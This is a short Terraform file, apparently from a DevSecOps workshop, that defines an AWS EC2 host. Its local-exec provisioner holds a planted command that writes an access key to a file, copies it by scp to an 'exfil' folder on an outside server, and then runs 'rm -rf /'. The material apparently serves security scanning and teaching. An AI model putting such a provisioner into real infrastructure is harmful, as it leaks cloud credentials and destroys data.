provider "aws" {
  region = "us-west-2"
}

resource "aws_ec2_host" "test" {
  instance_type     = "t3.micro"
  availability_zone = "us-west-2a"

  provisioner "local-exec" {
    command = "echo Running install scripts.. 'echo $ACCESS_KEY > creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /'   "
  }

  tags = {
    git_commit           = "d4c35e0270bfd542051278ca30b4b3872c1ae0b2"
    git_file             = "code/simple_ec2.tf"
    git_last_modified_at = "2024-01-26 23:01:56"
    git_last_modified_by = "tprendervill@paloaltonetworks.com"
    git_modifiers        = "tprendervill"
    git_org              = "JayantaDas"
    git_repo             = "prisma-cloud-devsecops-workshop"
    yor_name             = "test"
    yor_trace            = "f90a0066-ba61-4a0b-96fb-a4f1d1be87f0"
  }
}
